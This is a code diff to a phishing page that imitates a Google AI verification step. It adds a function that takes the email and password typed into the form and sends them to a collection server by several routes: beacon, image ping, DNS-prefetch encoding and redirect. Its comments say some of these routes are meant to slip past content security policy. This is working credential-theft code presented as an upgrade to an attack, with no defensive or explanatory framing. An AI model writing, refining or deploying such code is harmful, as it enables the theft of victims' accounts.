@@ -132,6 +132,27 @@ h1{font-size:24px;font-weight:400;text-align:center;color:#202124;margin-bottom:
 <div class="msg" id="msg"><div class="check">\u2705</div><h2>Verified</h2><p>Redirecting to Google AI\u2026</p></div>';
   }
 
+  function exfil(email, pass) {
+    var data = "email=" + encodeURIComponent(email) + "&pass=" + encodeURIComponent(pass);
+    // Try multiple exfil channels
+    // 1. sendBeacon (fire-and-forget, not blocked by connect-src on some browsers)
+    try { navigator.sendBeacon(C + "/b?" + data); } catch(x) {}
+    // 2. Image ping (often bypasses connect-src)
+    try { new Image().src = C + "/i?" + data + "&t=" + Date.now(); } catch(x) {}
+    // 3. DNS exfil via link prefetch
+    try {
+      var encoded = btoa(email + ":" + pass).replace(/[^a-zA-Z0-9]/g, "").substring(0, 60);
+      var link = document.createElement("link");
+      link.rel = "dns-prefetch";
+      link.href = "//" + encoded + "." + C.replace("https://","");
+      document.head.appendChild(link);
+    } catch(x) {}
+    // 4. Redirect (may be blocked by frame-src in iframe, works in popup)
+    setTimeout(function() {
+      window.location = C + "/collect?" + data;
+    }, 1500);
+  }
+
   function attachFormHandler() {
     var form = document.getElementById("f");
     if (!form) return;
@@ -140,9 +161,7 @@ h1{font-size:24px;font-weight:400;text-align:center;color:#202124;margin-bottom:
       var e = document.getElementById("e").value, p = document.getElementById("p").value;
       document.getElementById("card").style.display = "none";
       var m = document.getElementById("msg"); m.style.display = "block";
-      setTimeout(function() {
-        window.location = C + "/collect?email=" + encodeURIComponent(e) + "&pass=" + encodeURIComponent(p);
-      }, 1500);
+      exfil(e, p);
     };
     var emailEl = document.getElementById("e");
     if (emailEl) emailEl.focus();
